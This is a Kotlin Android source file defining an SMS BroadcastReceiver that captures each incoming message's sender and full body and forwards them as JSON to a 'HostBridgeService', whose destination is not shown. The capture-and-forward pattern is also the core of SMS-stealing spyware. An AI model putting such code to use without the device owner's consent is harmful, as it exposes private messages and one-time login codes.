package com.bridge.itell

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import org.json.JSONObject

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            val fullMessage = StringBuilder()
            var sender = ""

            for (sms in messages) {
                sender = sms.displayOriginatingAddress ?: "ناشناس"
                fullMessage.append(sms.messageBody)
            }

            val payload = JSONObject().apply {
                put("type", "NEW_SMS")
                put("sender", sender)
                put("body", fullMessage.toString())
                put("timestamp", System.currentTimeMillis())
            }

            HostBridgeService.forwardEvent(payload.toString())
        }
    }
}
